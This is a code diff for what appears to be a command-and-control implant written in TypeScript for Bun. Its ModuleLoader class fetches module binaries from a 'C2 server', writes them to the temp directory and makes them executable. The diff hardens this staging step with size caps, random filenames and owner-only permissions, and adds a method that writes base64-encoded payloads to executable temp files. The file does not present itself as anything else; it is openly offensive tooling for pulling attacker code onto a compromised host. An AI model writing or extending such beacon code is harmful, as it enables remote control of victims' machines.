@@ -15,11 +15,15 @@ import { tmpdir } from "node:os";
 import { chmod }  from "node:fs/promises";
 
 const MODULE_TIMEOUT_MS = 30_000;
+const MAX_MODULE_BYTES  = 10 * 1024 * 1024; // 10 MB cap
 
 export class ModuleLoader {
   /**
    * Fetch a module binary from the C2 server.
    * Returns the path to the written executable (in OS temp dir).
+   *
+   * Security: filename is a random UUID (not predictable), permissions are
+   * 0o700 (owner-only), and downloads larger than MAX_MODULE_BYTES are rejected.
    */
   static async fetchModule(
     name:     string,
@@ -34,11 +38,45 @@ export class ModuleLoader {
       throw new Error(`ModuleLoader: fetch failed: ${res.status}`);
     }
 
+    const contentLength = res.headers.get("content-length");
+    if (contentLength && parseInt(contentLength, 10) > MAX_MODULE_BYTES) {
+      throw new Error(`ModuleLoader: module exceeds max size (${MAX_MODULE_BYTES} bytes)`);
+    }
+
     const data     = new Uint8Array(await res.arrayBuffer());
-    const destPath = join(tmpdir(), `svc-mod-${beaconId}-${name}`);
+    if (data.byteLength > MAX_MODULE_BYTES) {
+      throw new Error(`ModuleLoader: module exceeds max size (${MAX_MODULE_BYTES} bytes)`);
+    }
+
+    const fileId     = crypto.randomUUID();
+    const destPath   = join(tmpdir(), `svc-mod-${fileId}`);
 
     await Bun.write(destPath, data);
-    await chmod(destPath, 0o755);
+    await chmod(destPath, 0o700);
+
+    return destPath;
+  }
+
+  /**
+   * Write an inline module payload (base64) to a temp file and return its path.
+   *
+   * Security: filename is a random UUID, permissions are 0o700, and the
+   * decoded payload is capped at MAX_MODULE_BYTES.
+   */
+  static async writePayload(
+    payloadBase64: string,
+  ): Promise<string> {
+    const data = Buffer.from(payloadBase64, "base64");
+    if (data.byteLength > MAX_MODULE_BYTES) {
+      throw new Error(`ModuleLoader: payload exceeds max size (${MAX_MODULE_BYTES} bytes)`);
+    }
+
+    const fileId   = crypto.randomUUID();
+    const destPath = join(tmpdir(), `svc-mod-${fileId}`);
+    const { chmod } = await import("node:fs/promises");
+
+    await Bun.write(destPath, data);
+    await chmod(destPath, 0o700);
 
     return destPath;
   }
